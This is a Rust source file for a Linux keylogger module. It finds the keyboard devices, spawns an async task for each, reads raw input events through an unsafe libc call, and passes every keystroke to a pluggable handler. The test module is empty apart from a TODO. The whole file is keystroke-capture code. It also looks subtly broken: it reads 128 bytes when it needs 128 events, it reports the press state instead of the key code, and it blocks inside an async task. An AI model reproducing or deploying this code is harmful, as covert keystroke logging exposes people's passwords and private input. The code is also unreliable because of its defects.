use std::io;
use std::os::fd::AsRawFd;
use std::path::Path;
use std::sync::Arc;

use crate::device::{find_keyboard_devices, Keyboard};

pub trait KeyEventHandler: Send + Sync {
    fn handle_ev(&self, kb_device: &Path, key: u32);
}

pub struct Keylogger {
    ev_handler: Arc<dyn KeyEventHandler>,
    keyboards: Vec<Keyboard>,
}

impl Keylogger {
    pub fn new(ev_handler: impl KeyEventHandler + 'static) -> io::Result<Self> {
        Ok(Self {
            ev_handler: Arc::new(ev_handler),
            keyboards: find_keyboard_devices()?.collect(),
        })
    }

    pub fn spawn_loggers(self) -> io::Result<()> {
        if self.keyboards.is_empty() {
            return Err(io::Error::new(io::ErrorKind::Other, "no keyboards found"));
        }

        for keyboard in self.keyboards {
            let ev_handler = Arc::clone(&self.ev_handler);
            tokio::spawn(handle_keystrokes(ev_handler, keyboard));
        }

        Ok(())
    }
}

async fn handle_keystrokes(ev_handler: Arc<dyn KeyEventHandler>, keyboard: Keyboard) {
    const MAX_INPUT_EV: usize = 128;
    let mut input_events = [libc::input_event {
        time: libc::timeval {
            tv_sec: 0,
            tv_usec: 0,
        },
        type_: 0,
        code: 0,
        value: 0,
    }; MAX_INPUT_EV];

    loop {
        let _ = unsafe {
            libc::read(
                keyboard.file.as_raw_fd(),
                input_events.as_mut_ptr() as *mut _,
                MAX_INPUT_EV,
            )
        };

        ev_handler.handle_ev(&keyboard.device, input_events[0].value as u32);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // TODO
}
